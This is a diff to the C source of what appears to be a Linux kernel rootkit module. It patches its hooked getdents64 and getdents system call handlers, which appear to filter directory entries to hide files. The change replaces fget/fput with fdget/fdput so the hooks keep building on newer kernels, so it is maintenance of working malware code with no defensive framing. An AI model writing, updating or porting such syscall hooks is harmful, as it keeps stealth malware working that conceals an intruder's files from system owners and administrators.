@@ -539,7 +539,7 @@ asmlinkage int hook_getdents64(const struct pt_regs *regs)
 	struct dentry_identifier current_id;
 	unsigned long offset = 0;
 
-	struct file *orig_dir;
+	struct fd orig_dir;
 	ino_t dir_ino;
 	dev_t orig_dev;
 	unsigned long flags;
@@ -554,10 +554,10 @@ asmlinkage int hook_getdents64(const struct pt_regs *regs)
 	error = copy_from_user(dirent_ker, dirent, ret);
 	if (error)
 		goto done;
-	orig_dir = fget(fd);
-	dir_ino = orig_dir->f_inode->i_ino;
-	orig_dev = orig_dir->f_inode->i_sb->s_dev>>12;
-	fput(orig_dir);
+	orig_dir = fdget(fd);
+	dir_ino = orig_dir.file->f_inode->i_ino;
+	orig_dev = orig_dir.file->f_inode->i_sb->s_dev>>12;
+	fdput(orig_dir);
 
 	while (offset < ret) {
 		current_dir =  (void *)dirent_ker + offset;
@@ -613,7 +613,7 @@ asmlinkage int hook_getdents(const struct pt_regs *regs)
 	struct dentry_identifier current_id;
 	unsigned long offset = 0;
 
-	struct file *orig_dir;
+	struct fd orig_dir;
         ino_t dir_ino;
         dev_t orig_dev;
         unsigned long flags;
@@ -629,10 +629,10 @@ asmlinkage int hook_getdents(const struct pt_regs *regs)
 	if (error)
 		goto done;
 
-	orig_dir = fget(fd);
-        dir_ino = orig_dir->f_inode->i_ino;
-        orig_dev = orig_dir->f_inode->i_sb->s_dev>>12;
-	fput(orig_dir);
+	orig_dir = fdget(fd);
+        dir_ino = orig_dir.file->f_inode->i_ino;
+        orig_dev = orig_dir.file->f_inode->i_sb->s_dev>>12;
+	fdput(orig_dir);
 
 	while (offset < ret) {
 		current_dir = (void *)dirent_ker + offset;
